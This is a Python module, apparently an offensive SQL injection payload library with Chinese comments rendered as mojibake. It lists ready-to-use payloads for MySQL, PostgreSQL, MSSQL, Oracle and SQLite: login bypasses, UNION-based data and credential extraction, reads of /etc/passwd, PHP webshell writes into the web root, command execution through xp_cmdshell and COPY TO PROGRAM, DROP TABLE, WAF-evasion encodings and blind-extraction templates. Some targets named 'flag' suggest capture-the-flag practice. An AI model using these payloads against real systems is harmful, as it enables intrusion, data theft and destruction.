"""SQL æ³¨å¥ Payload çæå¨.

è¦ç:
    - èåæ¥è¯¢æ³¨å¥ (UNION SELECT) â MySQL/PG/MSSQL/Oracle/SQLite
    - æ¥éæ³¨å¥ (Error-based) â 12+ ç§ææ³
    - å¸å°ç²æ³¨ (Boolean-based) â 6 ç§å¤æ­æ¹å¼
    - æ¶é´ç²æ³¨ (Time-based) â 5 ç§å»¶è¿ææ³
    - å å æ¥è¯¢ (Stacked Queries)
    - INSERT / UPDATE / DELETE æ³¨å¥
    - æ ååæ³¨å¥
    - information_schema è¢«ç¦ç»è¿
    - WAF ç»è¿æ â 30+ ç§
"""
from typing import List, Dict


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  æ¢æµä¸æ£æµ Payload
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

DETECTION: Dict[str, List[str]] = {
    "é­åæ¢æµ": [
        "'", '"', "')", '")', "'))",
        "\\", "';", "'; --", "'; #",
    ],
    "ä¸è½å¯ç ": [
        "admin' OR '1'='1",
        "admin' OR 1=1-- ",
        "admin' OR 1=1#",
        "admin'||1=1-- ",
    ],
    "åæ°æ¢æµ": [
        "' ORDER BY 1-- ",
        "' ORDER BY 2-- ",
        "' ORDER BY 3-- ",
        "' ORDER BY 5-- ",
        "' ORDER BY 10-- ",
        "' ORDER BY 20-- ",
    ],
    "åæ¾ä½æ¢æµ": [
        "' UNION SELECT NULL-- ",
        "' UNION SELECT NULL,NULL-- ",
        "' UNION SELECT NULL,NULL,NULL-- ",
        "' UNION SELECT 1,2,3-- ",
        "' UNION SELECT 1,2,3,4,5-- ",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
    ],
    "æ°æ®åºæçº¹": [
        "' UNION SELECT @@version,NULL-- ",
        "' UNION SELECT version(),NULL-- ",
        "' UNION SELECT banner,NULL FROM v$version WHERE rownum=1-- ",
        "' UNION SELECT sqlite_version(),NULL-- ",
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  å©ç¨ Payload â ææ°æ®åºå
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

EXPLOIT: Dict[str, List[Dict[str, str]]] = {
    # ââ MySQL ââââââââââââââââââââââââââââââââââââââââââââ
    "MySQL": [
        # ââ è®¤è¯/ç»å½ç»è¿ ââ
        {"name": "ð ä¸è½å¯ç -OR", "payload": "admin' OR '1'='1", "tip": "ç»å¸ä¸è½å¯ç ï¼ç»å½ç»è¿é¦é"},
        {"name": "ð ä¸è½å¯ç -OR 1=1", "payload": "admin' OR 1=1-- ", "tip": "-- æ³¨éæåç»­SQL"},
        {"name": "ð ä¸è½å¯ç -OR 1=1#", "payload": "admin' OR 1=1#", "tip": "# æ³¨éï¼MySQL ç¹æ"},
        {"name": "ð ä¸è½å¯ç -æ°¸ç", "payload": "' OR '1'='1' --", "tip": "æ éç¨æ·åï¼ç´æ¥è¿"},
        {"name": "ð ä¸è½å¯ç -æ¬å·", "payload": "admin') OR ('1'='1", "tip": "æ¬å·é­ååä½"},
        {"name": "ð ä¸è½å¯ç -åå¼å·", 'payload': 'admin\" OR \"1\"=\"1', "tip": "åå¼å·é­å"},
        {"name": "ð æ³¨éç»è¿-æ«å°¾", "payload": "admin' --", "tip": "æ³¨éæå¯ç æ ¡éªé¨å"},
        {"name": "ð UNIONç»è¿", "payload": "' UNION SELECT 1,'admin','fake'-- ", "tip": "æé åå¯ç åå¸æ³¨å¥"},
        # ââ èåæ¥è¯¢ ââ
        {"name": "å½ååºå", "payload": "' UNION SELECT database(),NULL,NULL-- "},
        {"name": "ææåºå", "payload": "' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata-- "},
        {"name": "è¡¨å (å½ååº)", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- "},
        {"name": "åå", "payload": "' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='TABLE_NAME'-- "},
        {"name": "è¯»æ°æ®", "payload": "' UNION SELECT group_concat(COL1,0x3a,COL2),NULL,NULL FROM TABLE_NAME-- "},
        {"name": "è¯»æä»¶", "payload": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- "},
        {"name": "å Shell", "payload": "' UNION SELECT '<?=eval($_POST[1]);?>',NULL,NULL INTO OUTFILE '/var/www/html/s.php'-- "},
        # æ¥éæ³¨å¥ â 10 ç§
        {"name": "æ¥é-updatexml", "payload": "' AND updatexml(1,concat(0x7e,database()),1)-- "},
        {"name": "æ¥é-extractvalue", "payload": "' AND extractvalue(1,concat(0x7e,database()))-- "},
        {"name": "æ¥é-floor", "payload": "' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- "},
        {"name": "æ¥é-exp", "payload": "' AND exp(~(SELECT * FROM (SELECT database())a))-- "},
        {"name": "æ¥é-geometrycollection", "payload": "' AND geometrycollection((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "æ¥é-polygon", "payload": "' AND polygon((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "æ¥é-multipoint", "payload": "' AND multipoint((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "æ¥é-multilinestring", "payload": "' AND multilinestring((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "æ¥é-linestring", "payload": "' AND linestring((SELECT * FROM (SELECT * FROM (SELECT database())a)b))-- "},
        {"name": "æ¥é-name_const", "payload": "' AND (SELECT * FROM (SELECT name_const(database(),1),name_const(database(),1))a)-- "},
        # æ¶é´ç²æ³¨ â 4 ç§å»¶æ¶
        {"name": "æ¶é´ç²æ³¨-sleep", "payload": "' AND IF(1=1,sleep(3),0)-- "},
        {"name": "æ¶é´ç²æ³¨-benchmark", "payload": "' AND IF(1=1,benchmark(5000000,sha1('x')),0)-- "},
        {"name": "æ¶é´ç²æ³¨-get_lock", "payload": "' AND get_lock('test',3)-- "},
        {"name": "æ¶é´ç²æ³¨-ç¬å¡å°ç§¯", "payload": "' AND (SELECT count(*) FROM information_schema.columns a,information_schema.columns b,information_schema.columns c)>0-- "},
        # å å æ³¨å¥
        {"name": "å å -show tables", "payload": "'; SHOW TABLES-- "},
        {"name": "å å -desc è¡¨ç»æ", "payload": "'; DESC users-- "},
        {"name": "å å -é¢ç¼è¯ç»è¿", "payload": "'; SET @a=CONCAT('SEL','ECT flag FROM flag');PREPARE s FROM @a;EXECUTE s-- "},
        {"name": "å å -handlerè¯»è¡¨", "payload": "'; HANDLER users OPEN AS h; HANDLER h READ FIRST; HANDLER h CLOSE-- "},
        # æ ååæ³¨å¥
        {"name": "æ åå-å«åæ³", "payload": "' UNION SELECT 1,2,3 FROM (SELECT 1,2,3 UNION SELECT * FROM flag)a-- "},
        {"name": "æ åå-joinæ³", "payload": "' UNION SELECT * FROM (SELECT * FROM flag AS a JOIN flag AS b)c-- "},
        {"name": "æ åå-åå¼å·ä¸æ ", "payload": "' UNION SELECT 1,group_concat(`2`),3 FROM (SELECT 1,2,3 UNION SELECT * FROM flag)a-- "},
        # information_schema è¢«ç¦
        {"name": "æ infoschema-innodb", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- "},
        {"name": "æ infoschema-sys", "payload": "' UNION SELECT group_concat(table_name),NULL,NULL FROM sys.schema_table_statistics_with_buffer-- "},
        {"name": "æ infoschema-æ´åçè¡¨", "payload": "' AND (SELECT count(*) FROM flag)>0-- "},
    ],

    # ââ PostgreSQL âââââââââââââââââââââââââââââââââââââââ
    "PostgreSQL": [
        {"name": "å½ååº", "payload": "' UNION SELECT current_database(),NULL-- "},
        {"name": "è¡¨å", "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- "},
        {"name": "åå", "payload": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TBL'-- "},
        {"name": "è¯»æä»¶-pg_read_file", "payload": "' UNION SELECT pg_read_file('/etc/passwd'),NULL-- "},
        {"name": "è¯»æä»¶-lo_import", "payload": "' UNION SELECT lo_import('/etc/passwd'),NULL-- "},
        {"name": "RCE-COPY", "payload": "'; COPY (SELECT '') TO PROGRAM 'id'-- "},
        {"name": "æ¥é-cast", "payload": "' AND 1=cast(version() AS int)-- "},
        {"name": "æ¶é´ç²æ³¨-pg_sleep", "payload": "' AND (SELECT 1 FROM pg_sleep(3))-- "},
        {"name": "å å -å»ºè¡¨", "payload": "'; CREATE TABLE test(f TEXT); COPY test FROM PROGRAM 'id';-- "},
    ],

    # ââ MSSQL ââââââââââââââââââââââââââââââââââââââââââââ
    "MSSQL": [
        {"name": "å½ååº", "payload": "' UNION SELECT DB_NAME(),NULL-- "},
        {"name": "è¡¨å", "payload": "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- "},
        {"name": "åå", "payload": "' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('TBL')-- "},
        {"name": "RCE-xp_cmdshell", "payload": "'; EXEC xp_cmdshell 'whoami'-- "},
        {"name": "å¯ç¨xp_cmdshell", "payload": "'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- "},
        {"name": "æ¥é-convert", "payload": "' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- "},
        {"name": "æ¥é-cast", "payload": "' AND 1=cast((SELECT DB_NAME()) AS int)-- "},
        {"name": "æ¶é´ç²æ³¨-waitfor", "payload": "'; IF 1=1 WAITFOR DELAY '0:0:3'-- "},
        {"name": "å å -å è¡¨", "payload": "'; DROP TABLE users-- "},
    ],

    # ââ Oracle âââââââââââââââââââââââââââââââââââââââââââ
    "Oracle": [
        {"name": "çæ¬", "payload": "' UNION SELECT banner FROM v$version WHERE rownum=1-- "},
        {"name": "è¡¨å", "payload": "' UNION SELECT table_name FROM all_tables-- "},
        {"name": "åå", "payload": "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='TBL'-- "},
        {"name": "æ¥é-utl_inaddr", "payload": "' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))-- "},
        {"name": "æ¥é-ctxsys", "payload": "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1))-- "},
        {"name": "æ¶é´ç²æ³¨-DBMS_LOCK", "payload": "' AND DBMS_LOCK.SLEEP(3)=1-- "},
        {"name": "æ¶é´ç²æ³¨-ç¬å¡å°ç§¯", "payload": "' AND (SELECT count(*) FROM all_objects t1,all_objects t2,all_objects t3,all_objects t4)>0-- "},
    ],

    # ââ SQLite âââââââââââââââââââââââââââââââââââââââââââ
    "SQLite": [
        {"name": "è¡¨å", "payload": "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "},
        {"name": "åå(SQL)", "payload": "' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='TBL'-- "},
        {"name": "è¯»æ°æ®", "payload": "' UNION SELECT group_concat(COL1||':'||COL2) FROM TBL-- "},
        {"name": "æ¶é´ç²æ³¨-randomblob", "payload": "' AND 1=randomblob(300000000)-- "},
        {"name": "æ¶é´ç²æ³¨-zeroblob", "payload": "' AND 1=zeroblob(300000000)-- "},
        {"name": "åæä»¶", "payload": "'; ATTACH DATABASE '/var/www/html/s.php' AS x; CREATE TABLE x.y(z TEXT); INSERT INTO x.y VALUES('<?=eval($_POST[1]);?>')-- "},
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  INSERT / UPDATE / DELETE æ³¨å¥
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

DML_INJECTION: Dict[str, List[Dict[str, str]]] = {
    "INSERT æ³¨å¥": [
        {"name": "å­æ¥è¯¢æå¥", "payload": "username=(SELECT database())&password=test"},
        {"name": "concat_ws æ¼æ¥", "payload": "username=concat_ws(',',(SELECT username),(SELECT password))"},
        {"name": "åå­è¿å¶ç¼ç ", "payload": "username=0x61646d696e272c2873656c6563742064617461626173652829292c2740"},
    ],
    "UPDATE æ³¨å¥": [
        {"name": "æ¡ä»¶æ³¨å¥", "payload": "password=',test') WHERE 1=1#"},
        {"name": "ç²æ³¨åµå¥", "payload": "password=',test') WHERE (SELECT length(database())=8)#"},
    ],
    "DELETE æ³¨å¥": [
        {"name": "èå´å é¤", "payload": "id=1 OR id=2 OR id=3#"},
        {"name": "æ¡ä»¶æ¢æµ", "payload": "id=1 OR (SELECT count(*) FROM flag)>0#"},
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  WAF ç»è¿æå·§
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

WAF_BYPASS: Dict[str, List[Dict[str, str]]] = {
    "å³é®å­åå½¢": [
        {"name": "å¤§å°åæ··å", "tip": "sElEcT / uNiOn / wHeRe", "eg": "'/**/sElEcT/**/1,2,3-- "},
        {"name": "ååç»è¿", "tip": "seselectlect / ununionion / anandd", "eg": "' seselectlect 1,2,3-- "},
        {"name": "åå¼å·åè£¹", "tip": "`select` / `union` / `and`", "eg": "' `union` `select` 1,2,3-- "},
        {"name": "æ³¨éç©¿æ", "tip": "s/*!*/el/*!*/ect", "eg": "' un/*!*/ion sel/*!*/ect 1,2,3-- "},
        {"name": "åèçæ¬æ³¨é", "tip": "/*!50000select*/", "eg": "' /*!50000union*/ /*!50000select*/ 1,2,3-- "},
        {"name": "æ¢è¡æå", "tip": "s\\ne\\nl\\ne\\nc\\nt", "eg": "' un%0aion sel%0aect 1,2,3-- "},
    ],
    "é»è¾ç­ä»·": [
        {"name": "è¿ç®ç¬¦æ¿æ¢", "tip": "orâ||  andâ&&  notâ!  xorâ^", "eg": "' || 1=1 || '"},
        {"name": "true/false", "tip": "1=1âtrue  1=2âfalse", "eg": "' AND true-- "},
        {"name": "æ°å¼åå½¢", "tip": "1â2-1  id=1âid=3-2", "eg": "' UNION SELECT 2-1,3-1,4-1-- "},
        {"name": "æµ®ç¹ç»è¿", "tip": "1.0 / -1.1 / +1.0", "eg": "1.0 UNION SELECT 1,2,3-- "},
        {"name": "ç§å­¦è®¡æ°", "tip": "1e0 / 1e1 / -1e0", "eg": "1e0UNION SELECT 1,2,3-- "},
        {"name": "nullå®å¨ç­äº", "tip": "<=> æ¿ä»£ =", "eg": "' AND 1 <=> 1-- "},
    ],
    "ç¼ç ç»è¿": [
        {"name": "URLç¼ç ", "tip": "ç©ºæ ¼â%20 'â%27 #â%23", "eg": "%27%20UNION%20SELECT%201,2,3%23"},
        {"name": "åéURLç¼ç ", "tip": "'â%2527 ç©ºæ ¼â%2520", "eg": "%2527%2520UNION%2520SELECT%25201%2523"},
        {"name": "Unicodeç¼ç ", "tip": "'â%u0027 ç©ºæ ¼â%u0020", "eg": "%u0027%20UNION%20SELECT%201,2%23"},
        {"name": "HTMLå®ä½ç¼ç ", "tip": "'â&#39; (â&#40;", "eg": "&#39; UNION SELECT 1,2,3#"},
        {"name": "16è¿å¶å­ç¬¦ä¸²", "tip": "selectâ0x73656C656374", "eg": "' UNION 0x73656C656374 1,2,3-- "},
        {"name": "char()å½æ°", "tip": "selectâchar(115,101,108,101,99,116)", "eg": "' UNION char(115,101,108,101,99,116) 1,2,3-- "},
        {"name": "from_base64", "tip": "MySQL: from_base64('c2VsZWN0')", "eg": "' UNION from_base64('c2VsZWN0') 1,2,3-- "},
        {"name": "unhex", "tip": "MySQL: unhex('73656c656374')", "eg": "' UNION unhex('73656c656374') 1,2,3-- "},
    ],
    "ç©ºç½ç¬¦ç»è¿": [
        {"name": "æ°´å¹³å¶è¡¨ %09", "tip": "TAB æ¿ä»£ç©ºæ ¼", "eg": "'%09UNION%09SELECT%091,2,3-- "},
        {"name": "æ¢è¡ %0a", "tip": "LF æ¿ä»£ç©ºæ ¼", "eg": "'%0aUNION%0aSELECT%0a1,2,3-- "},
        {"name": "åç´å¶è¡¨ %0b", "tip": "VT æ¿ä»£ç©ºæ ¼", "eg": "'%0bUNION%0bSELECT%0b1,2,3-- "},
        {"name": "æ¢é¡µ %0c", "tip": "FF æ¿ä»£ç©ºæ ¼", "eg": "'%0cUNION%0cSELECT%0c1,2,3-- "},
        {"name": "åè½¦ %0d", "tip": "CR æ¿ä»£ç©ºæ ¼", "eg": "'%0dUNION%0dSELECT%0d1,2,3-- "},
        {"name": "å¨è§ç©ºæ ¼ %a0", "tip": "NBSP æ¿ä»£ç©ºæ ¼", "eg": "'%a0UNION%a0SELECT%a01,2,3-- "},
        {"name": "æ¬å·æ¿ä»£ç©ºæ ¼", "tip": "UNION(SELECT(1),(2),(3))", "eg": "'UNION(SELECT(1),(2),(3))-- "},
    ],
    "å½æ°æ¿æ¢": [
        {"name": "substringâmid/left", "tip": "mid(pwd,1,1) left(pwd,1)", "eg": "' AND mid(database(),1,1)='t'-- "},
        {"name": "asciiâord/hex", "tip": "ord('a')=97 hex('a')=61", "eg": "' AND ord(mid(database(),1,1))=116-- "},
        {"name": "lengthâchar_length", "tip": "char_length() æ¿ä»£", "eg": "' AND char_length(database())=4-- "},
        {"name": "ifâcase when", "tip": "case when 1=1 then sleep(3) else 0 end", "eg": "' AND (case when 1=1 then sleep(3) else 0 end)-- "},
        {"name": "strcmp æ¿ä»£ç­å·", "tip": "strcmp('a','a')=0", "eg": "' AND strcmp(database(),'test')=0-- "},
        {"name": "greatest/least", "tip": "greatest(1,2)=2 least(1,2)=1", "eg": "' AND greatest((SELECT count(*) FROM flag),0)>0-- "},
        {"name": "coalesce", "tip": "coalesce((SELECT 1),0)=1", "eg": "' AND coalesce((SELECT count(*) FROM flag),0)=1-- "},
        {"name": "isnull", "tip": "isnull(null)=1 isnull(1)=0", "eg": "' AND isnull((SELECT 1 FROM flag))=0-- "},
    ],
    "å®½å­èæ³¨å¥": [
        {"name": "%df éå %27", "tip": "%df' â é' (åæåææ )", "eg": "%df' OR 1=1#"},
        {"name": "%81 éå %27", "tip": "%81' åçååææ ", "eg": "%81' OR 1=1#"},
        {"name": "é«é¶å®½å­è", "tip": "%df%5c%27 â äºæ¬¡ç¼ç ", "eg": "%df%5c%27 OR 1=1%23"},
    ],
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  ç²æ³¨éå­ç¬¦æåæ¨¡æ¿
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

BLIND_TEMPLATES: Dict[str, str] = {
    "å¸å°-éå­ (MySQL)": "1' AND SUBSTRING(({query}),{pos},1)='{char}'-- ",
    "å¸å°-LIKEåç¼ (MySQL)": "1' AND ({query}) LIKE '{prefix}%'-- ",
    "å¸å°-REGEXP (MySQL)": "1' AND ({query}) REGEXP '^{prefix}'-- ",
    "å¸å°-LEFT (MySQL)": "1' AND LEFT(({query}),{pos})='{full}'-- ",
    "äºåæ³ (MySQL)": "1' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- ",
    "æ¶é´-sleep (MySQL)": "1' AND IF(SUBSTRING(({query}),{pos},1)='{char}',sleep(2),0)-- ",
    "æ¶é´-pg_sleep (PG)": "1' AND (SELECT CASE WHEN SUBSTRING(({query}),{pos},1)='{char}' THEN pg_sleep(2) ELSE pg_sleep(0) END)-- ",
    "æ¶é´-waitfor (MSSQL)": "1'; IF SUBSTRING(({query}),{pos},1)='{char}' WAITFOR DELAY '0:0:2'-- ",
    "æ¶é´-DBMS_LOCK (Oracle)": "1' AND (SELECT CASE WHEN SUBSTR(({query}),{pos},1)='{char}' THEN dbms_pipe.receive_message(('a'),2) ELSE NULL END FROM dual)-- ",
    "æ¶é´-randomblob (SQLite)": "1' AND (CASE WHEN SUBSTR(({query}),{pos},1)='{char}' THEN randomblob(300000000) ELSE 0 END)-- ",
}


# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
#  æ¥è¯¢æ¥å£
# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

def get_detection(db_type: str = "") -> dict:
    if db_type and db_type in DETECTION:
        return {db_type: DETECTION[db_type]}
    return DETECTION


def get_exploit(db_type: str = "") -> dict:
    if db_type and db_type in EXPLOIT:
        return {db_type: EXPLOIT[db_type]}
    return EXPLOIT


def get_waf_bypass(category: str = "") -> dict:
    if category and category in WAF_BYPASS:
        return {category: WAF_BYPASS[category]}
    return WAF_BYPASS


def get_blind_template(db_type: str = "") -> dict:
    if db_type:
        return {k: v for k, v in BLIND_TEMPLATES.items() if db_type.lower() in k.lower()}
    return BLIND_TEMPLATES


def get_dml_injection(operation: str = "") -> dict:
    if operation and operation in DML_INJECTION:
        return {operation: DML_INJECTION[operation]}
    return DML_INJECTION


def search_payload(keyword: str) -> list:
    results = []
    for category, payloads in EXPLOIT.items():
        for p in payloads:
            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("name", "").lower():
                results.append({"category": category, **p})
    for cat, items in WAF_BYPASS.items():
        for item in items:
            if keyword.lower() in item.get("eg", "").lower() or keyword.lower() in item["tip"].lower():
                results.append({"category": f"WAF/{cat}", "name": item["name"], "payload": item["eg"]})
    return results
